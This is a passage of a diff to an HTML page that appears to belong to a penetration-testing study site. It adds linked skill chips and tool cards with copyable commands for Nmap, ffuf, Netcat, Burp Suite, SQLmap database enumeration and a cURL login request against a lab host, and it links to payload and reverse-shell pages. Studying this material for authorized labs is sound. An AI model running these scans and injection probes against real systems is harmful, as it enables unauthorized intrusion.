+<a href="handbook/modules/credential-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Brute-Force Methodology — Systematic permutation & login rate-limit verification"><span>Brute-Force Methodology</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/credential-security.html" class="px-2 py-1 rounded bg-canvas-base border border-secondary/30 font-mono text-[10px] text-secondary hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Password Hashes — MD5, SHA-256, NTLM & bcrypt identification"><span>Password Hashes (MD5/SHA)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/tools-reference.html#tool-hydra" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Hydra Login Audits — Fast network login auditing (SSH, FTP, HTTP form)"><span>Hydra Login Audits</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/tools-reference.html#tool-hashcat" class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Hashcat Recovery — GPU-accelerated offline hash cracking & rules"><span>Hashcat Recovery</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/tools-reference.html#tool-john" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="John the Ripper — /etc/shadow password auditing & automated format detection"><span>John the Ripper</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/credential-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-outline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="rockyou Wordlist Labs — 14M entry wordlist application in authorized labs"><span>rockyou Wordlist Labs</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
 </div>
 </div>
 <!-- Domain 6: Exploitation & PrivEsc Concepts -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-secondary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-secondary font-bold">
 <span class="material-symbols-outlined text-base">bug_report</span>
 <span>EXPLOITATION &amp; PRIVESC CONCEPTS</span>
 </div>
+<a href="handbook/modules/exploitation.html" class="text-[10px] text-secondary hover:underline font-mono flex items-center gap-0.5">Module 07 ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">Controlled validation and local privilege escalation methodology in educational rooms.</p>
-<div class="flex flex-wrap gap-1.5"><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold">CVE Analysis &amp; CVSS Scoring</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30">Exploit-DB / SearchSploit</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Metasploit Framework</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Meterpreter Sessions</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Linux Privilege Escalation &amp; SUID</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Payload &amp; Reverse Shell Handling</span></div>
+<div class="flex flex-wrap gap-1.5">
+<a href="handbook/modules/pentest-methodology.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="CVE Analysis & CVSS Scoring — Vulnerability metrics, exploitability & severity"><span>CVE Analysis &amp; CVSS</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/searchsploit.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30 hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Exploit-DB / SearchSploit — Local exploit database matching against service banners"><span>SearchSploit (Exploit-DB)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/metasploit.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Metasploit Framework — Verified exploit execution & handler setup"><span>Metasploit Framework</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/metasploit.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Meterpreter Sessions — Post-exploitation telemetry & session routing"><span>Meterpreter Sessions</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/privilege-escalation.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Linux Privilege Escalation & SUID — SUID binaries, sudo rules & kernel exploits"><span>Linux PrivEsc &amp; SUID</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="payloads.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-danger-critical border-danger-critical/30 font-bold hover:border-danger-critical hover:bg-danger-critical/10 transition-all flex items-center gap-1 group" title="Payload Hub — Reverse shells, CMDi bypasses, LFI & TTY upgrades"><span>Payloads &amp; Shells</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+</div>
 </div>
 <!-- Domain 7: Wireless Security -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-primary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-primary font-bold">
 <span class="material-symbols-outlined text-base">wifi_tethering</span>
 <span>WIRELESS SECURITY</span>
 </div>
+<a href="handbook/modules/network-security.html" class="text-[10px] text-primary hover:underline font-mono flex items-center gap-0.5">Module 02 ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">Authorized educational wireless analysis and radio frame evaluation.</p>
 <div class="flex flex-wrap gap-1.5">
-<span class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary">Wireless Reconnaissance</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Wi-Fi Security Concepts</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-secondary/30 font-mono text-[10px] text-secondary">Aircrack-ng Educational Rooms</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">WPA2 Handshake Concepts</span>
-<span class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface">Beacon &amp; Probe Frame Analysis</span>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-primary/30 font-mono text-[10px] text-primary hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Wireless Reconnaissance — BSSID discovery & channel frequency analysis"><span>Wireless Reconnaissance</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Wi-Fi Security Concepts — WEP, WPA2-PSK & WPA3 Enterprise protocols"><span>Wi-Fi Security Concepts</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-secondary/30 font-mono text-[10px] text-secondary hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Aircrack-ng Educational Rooms — Packet injection & monitor mode configuration"><span>Aircrack-ng Suite</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="WPA2 Handshake Concepts — 4-way EAPOL exchange capture in authorized labs"><span>WPA2 Handshake Concepts</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/network-security.html" class="px-2 py-1 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-on-surface hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Beacon & Probe Frame Analysis — 802.11 management frames & SSID broadcasting"><span>Beacon &amp; Probe Frames</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
 </div>
 </div>
 <!-- Domain 8: Programming & Systems -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-secondary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-secondary font-bold">
 <span class="material-symbols-outlined text-base">code</span>
 <span>PROGRAMMING &amp; SYSTEMS</span>
 </div>
+<a href="handbook/modules/security-automation.html" class="text-[10px] text-secondary hover:underline font-mono flex items-center gap-0.5">Module 08 ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">Core languages powering custom security tooling, automation scripts, and systems study.</p>
-<div class="flex flex-wrap gap-1.5"><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold">Python 3 (Security Scripting)</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30">Regex &amp; Pattern Extraction</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">C (Low-Level Fundamentals)</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Bash Automation</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">SQL (Querying &amp; Injections)</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Git Version Control</span></div>
+<div class="flex flex-wrap gap-1.5">
+<a href="handbook/modules/security-automation.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Python 3 Security Scripting — Socket networking, requests & exploit automation"><span>Python 3 (Security)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30 hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Regex & Pattern Extraction — PCRE syntax for security log parsing"><span>Regex &amp; Pattern Extraction</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/security-automation.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="C Low-Level Fundamentals — Memory management, pointers & buffer mechanics"><span>C (Low-Level Core)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/linux.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Bash Automation — Command pipelines, batch automation & cron triggers"><span>Bash Automation</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/web-security.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-secondary hover:text-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="SQL Querying & Injections — Relational schemas, parameterized queries & syntax"><span>SQL (Queries &amp; Injections)</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="handbook/modules/security-automation.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Git Version Control — Branching, commits, security submodules & workflows"><span>Git Version Control</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+</div>
 </div>
 <!-- Domain 9: AI + Security Automation -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3 hover:border-primary/50 transition-colors">
+<div class="flex items-center justify-between">
 <div class="flex items-center gap-2 font-mono text-xs text-primary font-bold">
 <span class="material-symbols-outlined text-base">psychology</span>
 <span>AI &amp; SECURITY AUTOMATION</span>
 </div>
+<a href="projects/autonomous-pentesting-agent.html" class="text-[10px] text-primary hover:underline font-mono flex items-center gap-0.5">Systems ↗</a>
+</div>
 <p class="text-xs text-on-surface-variant">Independent security engineering: private local inference, agent orchestration, and tooling.</p>
-<div class="flex flex-wrap gap-1.5"><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold">Security Automation Pipelines</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold">Agentic Security Workflows</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30">Ollama Runtime</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30 font-bold">Qwen3-Coder 30B Integration</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Autonomous Pentest Agents</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Vulnerability Triage Automation</span><span class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline">Zero Cloud Telemetry &amp; Data Privacy</span></div>
+<div class="flex flex-wrap gap-1.5">
+<a href="projects/autonomous-pentesting-agent.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Security Automation Pipelines — End-to-end recon-to-report automated pipelines"><span>Automation Pipelines</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="projects/autonomous-pentesting-agent.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-primary border-primary/30 font-bold hover:border-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Agentic Security Workflows — Multi-agent orchestration for scoped assessments"><span>Agentic Workflows</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="projects/cyberai.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30 hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Ollama Runtime — On-device local LLM execution engine"><span>Ollama Runtime</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="projects/cyberai.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-secondary border-secondary/30 font-bold hover:border-secondary hover:bg-secondary/10 transition-all flex items-center gap-1 group" title="Qwen3-Coder 30B Integration — High-parameter coding model for vuln analysis"><span>Qwen3-Coder 30B</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="projects/autonomous-pentesting-agent.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Autonomous Pentest Agents — Scoped AI agents with Kali Linux tooling integration"><span>Autonomous Agents</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="projects/sentinelai.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-on-surface border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Vulnerability Triage Automation — SentinelAI CVE and asset graph mapping"><span>Vuln Triage Automation</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+<a href="projects/local-ai-compute-stack.html" class="px-2 py-1 rounded bg-canvas-base border font-mono text-[10px] text-outline border-border-hairline hover:border-primary hover:text-primary hover:bg-primary/10 transition-all flex items-center gap-1 group" title="Zero Cloud Telemetry — Strictly private on-device security compute"><span>Zero Cloud Telemetry</span><span class="opacity-60 group-hover:opacity-100">↗</span></a>
+</div>
 </div>
 </div>
 </section>
@@ -667,8 +757,8 @@
 </div>
 <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
 <!-- Toolkit 1: Recon & Enumeration -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
-<div class="flex items-center justify-between">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-4 hover:border-primary/40 transition-colors">
+<div class="flex items-center justify-between pb-1 border-b border-border-hairline">
 <div class="flex items-center gap-2 font-mono text-xs text-primary font-bold">
 <span class="material-symbols-outlined text-base">radar</span>
 <span>RECON &amp; ENUMERATION</span>
@@ -676,24 +766,90 @@
 <span class="font-mono text-[10px] text-outline">PHASE 01</span>
 </div>
 <p class="text-xs text-on-surface-variant">Host discovery, open port detection, service versioning, and endpoint fuzzing.</p>
-<div class="space-y-2 pt-1 font-mono text-xs">
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-primary font-bold">Nmap</span>
-<span class="text-on-surface-variant text-[11px]">Port scans, NSE script audits &amp; OS discovery</span>
+<div class="space-y-3 font-mono text-xs">
+<!-- Nmap Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-primary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-primary font-bold text-sm">Nmap</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-primary/10 border border-primary/30 text-primary">PORT SCAN · OS</span>
+    </div>
+    <a href="handbook/nmap.html" class="text-[10px] text-outline hover:text-primary transition-colors flex items-center gap-0.5" title="View Full Nmap Manual">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Stealth SYN scans (-sS), service fingerprinting (-sV), and default NSE vulnerability audits on targets.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-primary overflow-x-auto">
+    <code class="truncate pr-2 select-all">nmap -sC -sV -p- -T4 target.lab</code>
+    <button type="button" onclick="navigator.clipboard.writeText('nmap -sC -sV -p- -T4 target.lab'); if(window.showToast) window.showToast('Copied Nmap command', 'success');" class="text-outline hover:text-primary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="nmap" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=nmap" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-secondary font-semibold">ffuf</span>
-<span class="text-on-surface-variant text-[11px]">Directory, parameter &amp; web fuzzing</span>
+<!-- ffuf Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-secondary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-secondary font-bold text-sm">ffuf</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-secondary/10 border border-secondary/30 text-secondary">WEB FUZZING</span>
+    </div>
+    <a href="handbook/modules/tools-reference.html#tool-ffuf" class="text-[10px] text-outline hover:text-secondary transition-colors flex items-center gap-0.5" title="View ffuf Documentation">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Fast web directory enumeration, hidden parameter discovery, and vhost fuzzing with SecLists.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-secondary overflow-x-auto">
+    <code class="truncate pr-2 select-all">ffuf -u http://target.lab/FUZZ -w common.txt</code>
+    <button type="button" onclick="navigator.clipboard.writeText('ffuf -u http://target.lab/FUZZ -w common.txt -mc 200,301'); if(window.showToast) window.showToast('Copied ffuf command', 'success');" class="text-outline hover:text-secondary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="ffuf" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=ffuf" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-on-surface font-semibold">Netcat</span>
-<span class="text-on-surface-variant text-[11px]">Banner grabbing &amp; port connectivity validation</span>
+<!-- Netcat Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-border-highlight transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-on-surface font-bold text-sm">Netcat</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-surface-raised border border-border-hairline text-outline">BANNER &amp; SOCKET</span>
+    </div>
+    <a href="handbook/modules/tools-reference.html#tool-netcat" class="text-[10px] text-outline hover:text-on-surface transition-colors flex items-center gap-0.5" title="View Netcat Documentation">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Raw socket connection testing, service banner grabbing, and binding reverse shell listeners.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-on-surface overflow-x-auto">
+    <code class="truncate pr-2 select-all">nc -nv target.lab 21</code>
+    <button type="button" onclick="navigator.clipboard.writeText('nc -nv target.lab 21'); if(window.showToast) window.showToast('Copied Netcat command', 'success');" class="text-outline hover:text-on-surface transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="netcat" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=nc" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
 </div>
 </div>
 <!-- Toolkit 2: Web Security -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
-<div class="flex items-center justify-between">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-4 hover:border-secondary/40 transition-colors">
+<div class="flex items-center justify-between pb-1 border-b border-border-hairline">
 <div class="flex items-center gap-2 font-mono text-xs text-secondary font-bold">
 <span class="material-symbols-outlined text-base">language</span>
 <span>WEB SECURITY</span>
@@ -701,24 +857,90 @@
 <span class="font-mono text-[10px] text-outline">PHASE 02</span>
 </div>
 <p class="text-xs text-on-surface-variant">Interception, parameter analysis, and vulnerability verification on web targets.</p>
-<div class="space-y-2 pt-1 font-mono text-xs">
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-secondary font-bold">Burp Suite</span>
-<span class="text-on-surface-variant text-[11px]">Proxy, Repeater, Intruder &amp; HTTP history</span>
+<div class="space-y-3 font-mono text-xs">
+<!-- Burp Suite Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-secondary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-secondary font-bold text-sm">Burp Suite</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-secondary/10 border border-secondary/30 text-secondary">PROXY &amp; REPEATER</span>
+    </div>
+    <a href="handbook/modules/web-security.html" class="text-[10px] text-outline hover:text-secondary transition-colors flex items-center gap-0.5" title="View Web Security Guide">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">HTTP interception proxy, Repeater request modification, and auth session verification.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-secondary overflow-x-auto">
+    <code class="truncate pr-2 select-all">burpsuite &amp; # Proxy: 127.0.0.1:8080</code>
+    <button type="button" onclick="navigator.clipboard.writeText('burpsuite &'); if(window.showToast) window.showToast('Copied Burp Suite command', 'success');" class="text-outline hover:text-secondary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="burp" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="payloads.html" class="text-secondary hover:underline flex items-center gap-1 font-semibold">
+      <span>Payload Hub ↗</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-on-surface font-semibold">ffuf</span>
-<span class="text-on-surface-variant text-[11px]">Web content discovery &amp; parameter fuzzing</span>
+<!-- SQLmap Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-danger-critical/40 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-danger-critical font-bold text-sm">SQLmap</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-danger-critical/10 border border-danger-critical/30 text-danger-critical">SQL INJECTION</span>
+    </div>
+    <a href="handbook/modules/tools-reference.html#tool-sqlmap" class="text-[10px] text-outline hover:text-danger-critical transition-colors flex items-center gap-0.5" title="View SQLmap Manual">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Automated SQLi detection, database schema dumping, and blind injection validation in lab rooms.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-danger-critical overflow-x-auto">
+    <code class="truncate pr-2 select-all">sqlmap -u "target.lab/item.php?id=1" --dbs</code>
+    <button type="button" onclick="navigator.clipboard.writeText('sqlmap -u &quot;http://target.lab/item.php?id=1&quot; --batch --dbs'); if(window.showToast) window.showToast('Copied SQLmap command', 'success');" class="text-outline hover:text-danger-critical transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="sqlmap" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=sqlmap" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-primary font-semibold">Browser DevTools</span>
-<span class="text-on-surface-variant text-[11px]">DOM inspection, JS debugging &amp; cookie review</span>
+<!-- Browser DevTools & cURL Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-primary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-primary font-bold text-sm">cURL / DevTools</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-primary/10 border border-primary/30 text-primary">API &amp; DOM</span>
+    </div>
+    <a href="handbook/modules/web-security.html" class="text-[10px] text-outline hover:text-primary transition-colors flex items-center gap-0.5" title="View Web Security Guide">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Client-side script inspection, cookie security verification, and raw cURL API request replication.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-primary overflow-x-auto">
+    <code class="truncate pr-2 select-all">curl -i -s -k -X POST target.lab/api</code>
+    <button type="button" onclick="navigator.clipboard.writeText('curl -i -s -k -X POST -d &quot;user=admin&quot; https://target.lab/api/login'); if(window.showToast) window.showToast('Copied cURL command', 'success');" class="text-outline hover:text-primary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="curl" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=curl" class="text-primary hover:underline flex items-center gap-1 font-semibold">
